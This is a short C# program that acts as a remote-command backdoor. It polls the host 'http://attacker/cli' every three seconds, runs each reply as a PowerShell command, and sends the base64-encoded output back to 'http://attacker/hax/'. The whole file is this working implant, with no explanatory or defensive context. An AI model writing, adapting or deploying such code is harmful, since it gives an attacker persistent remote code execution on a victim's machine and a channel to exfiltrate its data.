using System;
using System.Net;
using System.Diagnostics;
using System.Text;

namespace GetRequest
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true) {
	    	System.Threading.Thread.Sleep(3000);
		try {
			WebRequest request = WebRequest.Create("http://attacker/cli");
			WebResponse response = request.GetResponse();
            		System.IO.Stream dataStream = response.GetResponseStream();
            		System.IO.StreamReader reader = new System.IO.StreamReader(dataStream);
            		string responseFromServer = reader.ReadToEnd();
			int len_string = responseFromServer.Length;
			Console.WriteLine(len_string);
			if(len_string > 0) {
				var process = new Process();
				process.StartInfo.FileName = "powershell.exe";
				process.StartInfo.Arguments = "/C "+responseFromServer;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.Start();
				string output = process.StandardOutput.ReadToEnd();
				Console.WriteLine(output);
            			Console.WriteLine(responseFromServer);
				byte[] bytes = Encoding.UTF8.GetBytes(output);	
				string base64 = Convert.ToBase64String(bytes);
				var request2 = WebRequest.Create("http://attacker/hax/"+base64);
				request2.Method = "GET";
            			request2.GetResponse().Close();
				process.Kill();
            			reader.Close();
            			response.Close();
				}
			}
            	catch (Exception e) {
		Console.WriteLine("{0} Oops something went wrong.",e);	
		}
	    }

        }
    }
}
